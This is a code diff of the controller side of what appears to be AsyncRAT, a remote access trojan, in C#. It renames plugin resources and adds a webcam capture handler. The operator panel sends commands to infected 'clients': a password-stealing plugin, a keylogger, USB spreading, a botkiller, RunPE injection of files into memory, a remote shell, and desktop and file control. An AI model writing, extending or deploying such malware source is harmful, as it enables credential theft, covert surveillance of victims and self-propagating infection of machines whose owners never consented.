@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Windows.Forms;
 using Server.MessagePack;
-using Server.Sockets;
+using Server.Connection;
 using System.Threading.Tasks;
 using Microsoft.VisualBasic;
 using System.Linq;
@@ -9,7 +9,7 @@ using System.Threading;
 using System.Drawing;
 using System.IO;
 using Server.Forms;
-using Server.Cryptography;
+using Server.Algorithm;
 using System.Diagnostics;
 using System.Net.Sockets;
 using Server.Handle_Packet;
@@ -47,13 +47,15 @@ namespace Server
             {
                 if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config")))
                 {
-                    File.WriteAllText(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config"), Properties.Resources.AsyncRAT_Sharp_exe);
-                    Process.Start(Application.ExecutablePath);
+                    MessageBox.Show("Missing " + Path.GetFileName(Application.ExecutablePath) + ".config");
                     Environment.Exit(0);
                 }
 
                 if (!File.Exists(Path.Combine(Application.StartupPath, "cGeoIp.dll")))
+                {
                     MessageBox.Show("File 'cGeoIp.dll' Not Found!");
+                    Environment.Exit(0);
+                }
 
                 if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
                     Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
@@ -166,6 +168,7 @@ namespace Server
                     Clients client = (Clients)itm.Tag;
                     ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                 }
+                //GC.Collect();
             }
         }
 
@@ -314,7 +317,7 @@ namespace Server
                     else
                     {
                         msgpack.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;
-                        msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.Plugin);
+                        msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.PluginRunPE);
                     }
 
                     ListViewItem lv = new ListViewItem();
@@ -424,7 +427,7 @@ namespace Server
                                 ThreadPool.QueueUserWorkItem(client.Send, asyncTask.msgPack);
                             }
                         }
-                        await Task.Delay(15 * 1000);
+                        await Task.Delay(15 * 1000); //15sec per 1 task
                     }
             }
             catch { }
@@ -485,7 +488,7 @@ namespace Server
                 {
                     FormSendFileToMemory formSend = new FormSendFileToMemory();
                     formSend.ShowDialog();
-                    if (formSend.isOK)
+                    if (formSend.IsOK)
                     {
                         MsgPack msgpack = new MsgPack();
                         msgpack.ForcePathObject("Packet").AsString = "sendMemory";
@@ -498,7 +501,7 @@ namespace Server
                         else
                         {
                             msgpack.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;
-                            msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.Plugin);
+                            msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.PluginRunPE);
                             // github.com/Artiist/RunPE-Process-Protection
                         }
 
@@ -618,10 +621,13 @@ namespace Server
             {
                 try
                 {
+                    //DLL Plugin
+                    //msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+                    //msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.PluginDesktop);
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                     msgpack.ForcePathObject("Option").AsString = "capture";
-                    msgpack.ForcePathObject("Quality").AsInteger = 60;
+                    msgpack.ForcePathObject("Quality").AsInteger = 30;
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
@@ -635,8 +641,8 @@ namespace Server
                                     Name = "RemoteDesktop:" + client.ID,
                                     F = this,
                                     Text = "RemoteDesktop:" + client.ID,
-                                    C = client,
-                                    Active = true
+                                    ParentClient = client,
+                                    FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "RemoteDesktop")
                                 };
                                 remoteDesktop.Show();
                                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
@@ -670,7 +676,7 @@ namespace Server
                                     Name = "keyLogger:" + client.ID,
                                     Text = "keyLogger:" + client.ID,
                                     F = this,
-                                    C = client
+                                    Client = client
                                 };
                                 KL.Show();
                                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
@@ -701,7 +707,7 @@ namespace Server
                                     Name = "chat:" + client.ID,
                                     Text = "chat:" + client.ID,
                                     F = this,
-                                    C = client
+                                    Client = client
                                 };
                                 shell.Show();
                             }
@@ -734,7 +740,8 @@ namespace Server
                                     Name = "fileManager:" + client.ID,
                                     Text = "fileManager:" + client.ID,
                                     F = this,
-                                    C = client
+                                    Client = client,
+                                    FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "RemoteDesktop")
                                 };
                                 fileManager.Show();
                                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
@@ -754,13 +761,15 @@ namespace Server
                 {
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "recoveryPassword";
-                    msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.StealerLib);
+                    msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.PluginRecovery);
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
                         client.LV.ForeColor = Color.Red;
                         ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
+                    new HandleLogs().Addmsg("Sending Password Recovery..", Color.Black);
+                    tabControl1.SelectedIndex = 1;
                 }
                 catch { }
             }
@@ -788,7 +797,7 @@ namespace Server
                                     Name = "processManager:" + client.ID,
                                     Text = "processManager:" + client.ID,
                                     F = this,
-                                    C = client
+                                    Client = client
                                 };
                                 processManager.Show();
                                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
@@ -813,6 +822,8 @@ namespace Server
                         Clients client = (Clients)itm.Tag;
                         ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
+                    new HandleLogs().Addmsg("Sending Botkiller..", Color.Black);
+                    tabControl1.SelectedIndex = 1;
                 }
                 catch { }
             }
@@ -826,12 +837,14 @@ namespace Server
                 {
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "usbSpread";
-                    msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.HandleLimeUSB);
+                    msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.PluginUsbSpread);
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
                         ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
+                    new HandleLogs().Addmsg("Sending USB Spread..", Color.Black);
+                    tabControl1.SelectedIndex = 1;
                 }
                 catch { }
             }
@@ -1078,7 +1091,7 @@ namespace Server
                                     Name = "shell:" + client.ID,
                                     Text = "shell:" + client.ID,
                                     F = this,
-                                    C = client
+                                    Client = client
                                 };
                                 shell.Show();
                                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
@@ -1142,7 +1155,7 @@ namespace Server
 
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "recoveryPassword";
-            msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.StealerLib);
+            msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.PluginRecovery);
             ListViewItem lv = new ListViewItem();
             lv.Text = "Recovery Password";
             lv.SubItems.Add("0");
@@ -1233,6 +1246,41 @@ namespace Server
                     {
                         Clients client = (Clients)itm.Tag;
                         ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
+                }
+                catch { }
+            }
+        }
+
+        private void WebcamToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                try
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "webcam";
+                    msgpack.ForcePathObject("Command").AsString = "getWebcams";
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        Clients client = (Clients)itm.Tag;
+                        this.BeginInvoke((MethodInvoker)(() =>
+                        {
+                            FormWebcam remoteDesktop = (FormWebcam)Application.OpenForms["Webcam:" + client.ID];
+                            if (remoteDesktop == null)
+                            {
+                                remoteDesktop = new FormWebcam
+                                {
+                                    Name = "Webcam:" + client.ID,
+                                    F = this,
+                                    Text = "Webcam:" + client.ID,
+                                    ParentClient = client,
+                                    FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "Camera")
+                                };
+                                remoteDesktop.Show();
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            }
+                        }));
                     }
                 }
                 catch { }
